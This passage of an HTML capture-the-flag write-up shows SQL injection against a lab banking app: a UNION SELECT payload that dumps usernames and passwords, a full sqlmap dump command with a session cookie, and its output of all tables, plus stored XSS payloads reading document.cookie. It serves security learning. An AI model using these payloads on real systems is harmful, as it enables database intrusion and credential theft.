referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2c5dd632-11a2-806c-b939-ea9058bf389e" class="code code-wrap"><code class="language-PHP" style="white-space:pre-wrap;word-break:break-all">&#x27;) UNION SELECT NULL, NULL, CONCAT(username,&#x27;:&#x27;,password), NULL, NULL, NULL, NULL, NULL FROM users-- -</code></pre></div><div style="display:contents" dir="auto"><p id="2c5dd632-11a2-804c-997e-dd7b628cbb8c" class=""><code>CONCAT()</code> is a SQL function that combines multiple strings into one.</p></div><div style="display:contents" dir="auto"><p id="2c5dd632-11a2-8051-8d9c-c21f03afe89b" class="">Without <code>CONCAT()</code> we would only be able to extract one column at a time.</p></div><div style="display:contents" dir="auto"><p id="2c5dd632-11a2-80a0-ae42-f2566b375204" class=""><code>CONCAT()</code> :</p></div><div style="display:contents" dir="auto"><ul id="2c5dd632-11a2-809b-943e-e9042655ea1e" class="bulleted-list"><li style="list-style-type:disc">Combine multiple columns into one visible field</li></ul></div><div style="display:contents" dir="auto"><ul id="2c5dd632-11a2-80a7-80b5-c6d5bf61ac00" class="bulleted-list"><li style="list-style-type:disc">Add separators (like <code>:</code> or <code>|</code> to tell where one value ends and another begins</li></ul></div><div style="display:contents" dir="auto"><ul id="2c5dd632-11a2-8031-98e2-cb4e007b0703" class="bulleted-list"><li style="list-style-type:disc">Extract more data per query</li></ul></div><div style="display:contents" dir="ltr"><figure id="2c5dd632-11a2-803e-ba90-e01a7e0f2d7e" class="image"><a href="image%208.png"><img style="width:681.96875px" src="image%208.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="2c5dd632-11a2-8005-848c-fede72a0bea3" class="">We succesfully dumped the users credentials. Note that in a real case, these would most likely be encrypted with a strong algorithme. Basically the database would hold the hash of each users password and not in plain text as in this example.</p></div></div></details></div><div style="display:contents" dir="auto"><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0">Bonus : SQLMap :</summary><div class="indented"><div style="display:contents" dir="auto"><p id="2c5dd632-11a2-80a7-92e0-f4386da60f83" class="">The manual workflow can be automated using <code>SQLMap.</code> </p></div><div style="display:contents" dir="auto"><p id="2c5dd632-11a2-8048-9ae9-e0f999dba0b2" class="">To run the attack with <code>SQLMap</code> we first have to give it the following information :</p></div><div style="display:contents" dir="auto"><hr id="2c5dd632-11a2-8084-ac91-eab86d71dfab"/></div><div style="display:contents" dir="auto"><ul id="2c5dd632-11a2-806d-91a0-dec6d91d317f" class="bulleted-list"><li style="list-style-type:disc"><code>-u</code> = Specifies the target URL</li></ul></div><div style="display:contents" dir="auto"><ul id="2c5dd632-11a2-80d1-bcf8-f35167bebabb" class="bulleted-list"><li style="list-style-type:disc"><code>--cookie</code> flag = Sends cookies with each request</li></ul></div><div style="display:contents" dir="auto"><ul id="2c5dd632-11a2-80bb-9706-c2d87d0978df" class="bulleted-list"><li style="list-style-type:disc"><code>--batch</code> = SQLMap automatically chooses deffault answers (carefully use this).</li></ul></div><div style="display:contents" dir="auto"><ul id="2c5dd632-11a2-80c5-8527-dbc79c3cc46f" class="bulleted-list"><li style="list-style-type:disc"><code>--dump</code> = Extract and display ALL data from discovered databases</li></ul></div><div style="display:contents" dir="auto"><hr id="2c5dd632-11a2-807d-bc20-ef2ffbe7f428"/></div><div style="display:contents" dir="auto"><p id="2c5dd632-11a2-80d4-a680-fe26dbfefe36" class=""><em><code><strong>Command : </strong></code></em></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2c5dd632-11a2-808c-9902-efbf01717e2a" class="code code-wrap"><code class="language-PHP" style="white-space:pre-wrap;word-break:break-all">sqlmap -u &quot;http://192.168.126.128/securebank/transactions.php?search=test&quot; \
+       --cookie=&quot;PHPSESSID=q3k2if2q8hdb31ir5i6pairpcn&quot; \
+       --batch \
+       --dump</code></pre></div><div style="display:contents" dir="auto"><p id="2c5dd632-11a2-8027-8675-e0980074de8c" class="">This returns everything in the database :</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2c5dd632-11a2-80fb-bd70-ec5314c7a9e4" class="code code-wrap"><code class="language-PHP" style="white-space:pre-wrap;word-break:break-all">        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.9.11#stable}
+|_ -| . [,]     | .&#x27;| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+
+Parameter: search (GET)
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: search=test&#x27;) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(CONCAT(&#x27;qzkvq&#x27;,&#x27;bdtbkoOgywgvVZndFIIFyczUxjctQwnLvKyvbJhf&#x27;),&#x27;qpxqq&#x27;)-- pAtb
+---
+[11:00:01] [INFO] testing MySQL
+[11:00:01] [INFO] confirming MySQL
+[11:00:01] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.58
+back-end DBMS: MySQL &gt;= 8.0.0
+[11:00:01] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
+[11:00:01] [INFO] fetching current database
+[11:00:01] [INFO] fetching tables for database: &#x27;securebank_ctf&#x27;
+[11:00:01] [INFO] fetching columns for table &#x27;admin_logs&#x27; in database &#x27;securebank_ctf&#x27;
+[11:00:01] [INFO] fetching entries for table &#x27;admin_logs&#x27; in database &#x27;securebank_ctf&#x27;
+Database: securebank_ctf
+Table: admin_logs
+[3 entries]
++----+--------------------------+------------------------------------+---------------+---------------------+
+| id | flag                     | details                            | action        | timestamp           |
++----+--------------------------+------------------------------------+---------------+---------------------+
+| 1  | FLAG{XSS_4TT4CK_SUCCESS} | Database backup completed          | system_backup | 2025-12-08 02:00:00 |
+| 2  | NULL                     | New user registration: alice_brown | user_created  | 2025-12-05 11:20:00 |
+| 3  | FLAG{H1DD3N_4DM1N_P4N3L} | Vulnerability scan completed       | security_scan | 2025-12-07 22:15:00 |
++----+--------------------------+------------------------------------+---------------+---------------------+
+
+[11:00:01] [INFO] table &#x27;securebank_ctf.admin_logs&#x27; dumped to CSV file &#x27;/home/kali/.local/share/sqlmap/output/192.168.126.128/dump/securebank_ctf/admin_logs.csv&#x27;
+[11:00:01] [INFO] fetching columns for table &#x27;support_tickets&#x27; in database &#x27;securebank_ctf&#x27;
+[11:00:01] [INFO] fetching entries for table &#x27;support_tickets&#x27; in database &#x27;securebank_ctf&#x27;
+Database: securebank_ctf
+Table: support_tickets
+[6 entries]
++----+---------+----------------------------------------------+----------+----------------------------------------------+---------------------+
+| id | user_id | message                                      | status   | subject                                      | created_at          |
++----+---------+----------------------------------------------+----------+----------------------------------------------+---------------------+
+| 1  | 2       | I forgot my password                         | open     | Cannot login                                 | 2025-12-07 10:00:00 |
+| 2  | 3       | I did not authorize this                     | closed   | Suspicious transaction                       | 2025-12-06 15:30:00 |
+| 3  | 1       | &lt;img src=&quot;&quot; onerror=prompt(0)&gt;               | open     | &lt;img src=&quot;&quot; onerror=prompt(0)&gt;               | 2025-12-09 19:04:48 |
+| 4  | 1       | &lt;img src=&quot;&quot; onerror=prompt(0)&gt;               | open     | &lt;img src=&quot;&quot; onerror=prompt(0)&gt;               | 2025-12-09 19:04:54 |
+| 5  | 1       | &lt;img src=&quot;&quot; onerror=document.cookie&gt;         | open     | &lt;img src=&quot;&quot; onerror=document.cookie&gt;         | 2025-12-09 19:05:54 |
+| 6  | 1       | &lt;img src=&quot;&quot; onerror=prompt(document.cookie)&gt; | open     | &lt;img src=&quot;&quot; onerror=prompt(document.cookie)&gt; | 2025-12-09 19:06:12 |
++----+---------+----------------------------------------------+----------+----------------------------------------------+---------------------+
+
+[11:00:01] [INFO] table &#x27;securebank_ctf.support_tickets&#x27; dumped to CSV file &#x27;/home/kali/.local/share/sqlmap/output/192.168.126.128/dump/securebank_ctf/support_tickets.csv&#x27;
+[11:00:01] [INFO] fetching columns for table &#x27;transactions&#x27; in database &#x27;securebank_ctf&#x27;
+[11:00:01] [INFO] fetching entries for table &#x27;transactions&#x27; in database &#x27;securebank_ctf&#x27;
+Database: securebank_ctf
+Table: transactions
+[13 entries]
++----+---------+------------+---------+-----------+--------------------------------+--------------------------------+---------------------+
+| id | user_id | type       | amount  | status    | recipient                      | description                    | transaction_date    |
++----+---------+------------+---------+-----------+--------------------------------+--------------------------------+---------------------+
+| 1  | 2       | transfer   | 500.00  | completed | Landlord Inc                   | Rent payment                   | 2025-12-01 10:30:00 |
+| 2  | 2       | deposit    | 1000.00 | completed | Employer Corp                  | Salary                         | 2025-12-05 09:00:00 |
+| 3  | 3       | transfer   | 200.00  | completed | Amazon                         | Shopping                       | 2025-12-03 14:20:00 |
+| 4  | 3       | withdrawal | 150.00  | completed | ATM #4521                      | ATM withdrawal                 | 2025-12-06 18:45:00 |
+| 5  | 4       | transfer   | 50.00   | completed | Starbucks                      | Coffee                         | 2025-12-02 08:15:00 |
+| 6  | 1       | transfer   | 0.01    | completed | &lt;img src=&quot;&quot; onerror=prompt(0)&gt; | &lt;img src=&quot;&quot; onerror=prompt(0)&gt; | 2025-12-09 19:04:37 |
+| 7  | 1       | transfer   | 0.01    | completed | &lt;img src=&quot;&quot; onerror=prompt(0)&gt; | &lt;img src=&quot;&quot; onerror=prompt(0)&gt; | 2025-12-09 19:19:48 |
+| 8  | 1       | transfer   | 0.01    | completed | &lt;blank&gt;                        | &lt;blank&gt;                        | 2025-12-09 19:20:01 |
+| 9  | 1       | transfer   | 0.01    | completed | &lt;blank&gt;                        | &lt;blank&gt;                        | 2025-12-09 19:20:10 |
+| 10 | 1       | transfer   | 0.01    | completed | &#x27;                              | &#x27;                              | 2025-12-09 19:20:16 |
+| 11 | 1       | transfer   | 0.01    | completed | &#x27;                              | test;                          | 2025-12-09 19:20:25 |
+| 12 | 1       | transfer   | 0.01    | completed | test;                          | test;                          | 2025-12-09 19:20:33 |
+| 13 | 1       | transfer   | 0.01    | completed | test;                          | test;                          | 2025-12-09 19:20:39 |
++----+---------+------------+---------+-----------+--------------------------------+--------------------------------+---------------------+
+
+[11:00:01] [INFO] table &#x27;securebank_ctf.transactions&#x27; dumped to CSV file &#x27;/home/kali/.local/share/sqlmap/output/192.168.126.128/dump/securebank_ctf/transactions.csv&#x27;
+[11:00:01] [INFO] fetching columns for table &#x27;users&#x27; in database &#x27;securebank_ctf&#x27;
+[11:00:01] [INFO] fetching entries for table &#x27;users&#x27; in database &#x27;securebank_ctf&#x27;
+Database: securebank_ctf
+Table: users
+[5 entries]
++----+----------------------+---------------+------------+-------------+-------------+----------------------------+----------------+
+| id | email                | role          | balance    | password    | username    | secret_note                | account_number |
++----+----------------------+---------------+------------+-------------+-------------+----------------------------+----------------+
+| 1  | admin@securebank.com | administrator | 1000000.00 | Admin@2025! | admin       | FLAG{SQL_1NJ3CT10N_M4ST3R} | ACC-1000001    |
+| 2  | john@email.com       | customer      | 5420.50    | John123!    | john_smith  | My secret PIN is 1234      | ACC-1000002    |
+| 3  | sarah@email.com      | customer      | 12890.75   | Sarah456!   | sarah_jones | Remember to pay rent       | ACC-1000003    |
+| 4  | bob@email.com        | customer      | 890.25     | Bob789!     | bob_wilson  | Grocery list: milk, eggs   | ACC-1000004    |
+| 5  | alice@email.com      | vip           | 25600.00   | Alice321!   | alice_brown | FLAG{1D0R_VULN_F0UND}      | ACC-1000005    |
++----+----------------------+---------------+------------+-------------+-------------+----------------------------+----------------+
+
+[11:00:01] [INFO] table &#x27;securebank_ctf.users&#x27; dumped to CSV file &#x27;/home/kali/.local/share/sqlmap/output/192.168.126.128/dump/securebank_ctf/users.csv&#x27;
+[11:00:01] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 35 times
+[11:00:01] [INFO] fetched data logged to text files under &#x27;/home/kali/.local/share/sqlmap/output/192.168.126.128&#x27;
+
+[*] ending @ 11:00:01 /2025-12-10/
+</code></pre></div></div></details></div></div>
+        </div>
+    </main>
+
+    <footer>
+        <p>© 2025 RubberDuck9705 | SQL-Injection in search parameter : WriteUp</p>
+    </footer>
+</body>
+</html>
